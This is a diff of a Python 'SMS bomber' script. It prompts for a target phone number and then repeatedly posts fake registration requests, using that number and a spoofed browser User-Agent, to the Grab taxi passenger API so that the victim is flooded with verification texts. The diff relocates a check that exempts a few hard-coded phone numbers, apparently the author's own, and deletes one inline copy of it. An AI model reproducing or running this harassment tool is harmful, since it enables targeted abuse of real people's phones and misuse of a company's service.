@@ -13,6 +13,20 @@ print(Fore.GREEN + Back.BLACK + Style.BRIGHT + '''
     |_/\_| \_/\_| |_/\_/                                              
 ''' + Style.RESET_ALL)
 
+try:
+
+  _phone=input('Enter Target Number --> ')
+
+  if int(_phone)==int(905369413790):exit()
+
+  elif int(_phone)==int(+905369413790):exit()
+
+  elif int(_phone)==int(9053845383838):exit()
+
+  elif int(_phone)==int(+9053845383838):exit()
+
+except:
+      pass
 
 
 def shutdown(signal, frame):
@@ -50,20 +64,6 @@ except Exception:
     pass
 
 
-try:
-
-  _phone=input('Enter Target Number --> ')
-
-  if int(_phone)==int(905369413790):exit()
-
-  elif int(_phone)==int(+905369413790):exit()
-
-  elif int(_phone)==int(9053845383838):exit()
-
-  elif int(_phone)==int(+9053845383838):exit()
-
-except:
-      pass
 
 
 
@@ -96,7 +96,7 @@ while True:
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
 	try:
-                if int(_phone)==int(905369413790):exit()
+                
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
 		print('[+] Grab Requests Successful!')
 	except:
